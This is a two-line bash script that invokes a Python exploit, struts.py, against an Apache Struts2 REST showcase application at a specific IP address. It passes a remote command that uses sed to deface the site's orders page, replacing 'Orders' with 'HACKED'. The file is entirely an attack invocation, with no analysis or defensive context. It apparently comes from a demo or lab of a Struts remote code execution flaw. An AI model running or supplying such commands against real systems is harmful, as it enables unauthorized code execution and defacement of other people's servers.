#!/bin/bash

python3 struts.py http://52.24.68.85:8080/struts2-rest-showcase/ "sed -i -e 's/Orders/HACKED/g' webapps/struts2-rest-showcase/WEB-INF/content/orders-index.jsp"

